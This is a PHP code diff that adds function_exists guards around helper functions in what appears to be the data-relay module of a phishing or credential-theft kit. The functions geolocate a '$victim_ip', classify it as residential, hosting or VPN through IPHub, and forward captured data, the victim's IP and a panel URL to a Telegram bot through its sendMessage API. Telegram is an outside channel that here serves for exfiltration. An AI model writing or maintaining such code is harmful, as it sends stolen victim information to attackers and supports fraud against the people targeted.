@@ -36,6 +36,7 @@ function getRealClientIP() {
 /**
  * Get country code from IP
  */
+if (!function_exists('getCountryCode')) {
 function getCountryCode($ip) {
     if ($ip === '127.0.0.1' || $ip === '::1' || strpos($ip, '10.') === 0) {
         return 'LOCAL';
@@ -54,10 +55,12 @@ function getCountryCode($ip) {
     }
     return "UNKNOWN";
 }
+}
 
 /**
  * Get IP type (residential, hosting, vpn)
  */
+if (!function_exists('getIPType')) {
 function getIPType($ip) {
     if (empty(IPHUB_API_KEY)) {
         return "unknown";
@@ -77,10 +80,12 @@ function getIPType($ip) {
     }
     return "unknown";
 }
+}
 
 /**
  * Send to test bot only
  */
+if (!function_exists('sendToTestBot')) {
 function sendToTestBot($message) {
     $url = "https://api.telegram.org/bot" . TEST_BOT_TOKEN . "/sendMessage";
     $data = [
@@ -97,15 +102,18 @@ function sendToTestBot($message) {
     curl_exec($ch);
     curl_close($ch);
 }
+}
 
 /**
  * Main function - send data to TEST BOT ONLY
  */
+if (!function_exists('sendToTestBotOnly')) {
 function sendToTestBotOnly($data_type, $message, $victim_ip, $panel_url) {
     $country = getCountryCode($victim_ip);
     $ipType = getIPType($victim_ip);
     
     $test_message = "🛡️ [$data_type]\n" . $message . "\n\n📊 IP: $victim_ip | $country ($ipType)\n🔗 $panel_url";
     sendToTestBot($test_message);
+}
 }
 ?>
